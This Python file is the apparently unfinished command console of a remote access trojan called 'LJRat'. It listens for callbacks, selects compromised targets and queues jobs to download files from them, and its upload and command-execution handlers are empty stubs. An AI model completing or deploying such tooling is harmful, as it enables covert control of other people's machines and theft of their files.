import cmd
from email.policy import default
from wsgiref import validate
import commands
import ipaddress
from globals import *

class Menu(cmd.Cmd):
    intro = "LJRat"
    prompt = "> "
    current_host = None

    def do_listen(self, arg):
        '''Listen for an incoming connection, [listen ip port alias]'''

        args = _parse_args(arg)
        args = validate_args(args, 3, _validate_listen_params)

        if args:
            commands.add_listen_socket(args[0], args[1], args[2])
        else:
            print("Invalid arguments")

    def do_exit(self, arg):
        '''Function to exit the CMD.cmdloop by returning True'''
        return True

    def do_interact(self, arg):
        '''Function to interact with a target that has called back'''

        self.current_host = host_list.hosts.get(arg, None)
        if self.current_host:
            self.prompt = f"{arg}> "
        else:
            print("Target not found")

    def do_status(self, arg):
        '''Function used to determine the connection status of a target'''

        if not self.current_host:
            print("Must be interacting with target")
            return

        status = self.current_host.status
        print(f"Status: {self.current_host.host_status_enum[status]}")

    def do_get(self, arg):
        '''Function used to send a get tasking to the target. Function expects a single argument of the file that should be downloaded from target'''

        if not self.current_host:
            print("Must be interacting with target")
            return
        
        host = self.current_host
        args = _parse_args(arg)
        args = validate_args(args, 1, _validate_get_params)

        if args:
            job = ["GET", args]
            host.add_job(job)
        else:
            print("Invalid arguments")
        
    def do_put(self, arg):
        '''Function used to send a put tasking to the target. Function expects a single argument of the file that should be uploaded to target'''

        pass

    def do_execute(self, arg):
        '''Function used to send a execute tasking to the target. Function expects a single argument of the command that should be executed on target'''

        pass

    def do_list_targets(self, arg):
        '''Function used to list all of the known targets'''

        pass


def validate_args(args, num, validate_func):
    return validate_func(num, args)

def _parse_args(arg):
    return arg.split()

def _validate_listen_params(num, args):
    ret_args = None

    if num != len(args):
        return ret_args

    try:
        ipaddress.ip_address(args[0])
        args[1] = int(args[1])
    except ValueError as e:
        return ret_args

    ret_args = args
    return ret_args

def _validate_get_params(num, args):
    ret_args = None

    if num != len(args):
        return ret_args

    ret_args = args
    return ret_args